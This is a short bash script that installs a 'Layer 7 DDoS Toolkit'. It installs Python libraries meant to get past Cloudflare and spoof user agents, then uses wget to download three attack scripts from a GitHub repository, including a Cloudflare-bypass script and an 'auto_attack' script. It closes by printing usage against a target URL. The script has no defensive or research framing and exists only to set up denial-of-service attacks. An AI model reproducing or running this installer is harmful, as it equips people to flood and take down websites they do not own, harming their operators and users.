#!/bin/bash
# Auto Install Layer 7 DDoS Toolkit

echo "[+] Installing Layer 7 DDoS Toolkit..."

# Update system
apt update && apt upgrade -y

# Install Python
apt install python3 python3-pip -y

# Install dependencies
pip3 install requests colorama fake-useragent cloudscraper cfscrape urllib3 httpx

# Install tools
apt install curl wget git nmap -y

# Download scripts
wget https://raw.githubusercontent.com/deep-ai-tools/layer7-ddos/main/layer7_master.py
wget https://raw.githubusercontent.com/deep-ai-tools/layer7-ddos/main/cloudflare_bypass_layer7.py
wget https://raw.githubusercontent.com/deep-ai-tools/layer7-ddos/main/auto_attack.py

# Make executable
chmod +x *.py

echo "[+] Installation complete!"
echo "[+] Usage: python3 layer7_master.py https://target.com"
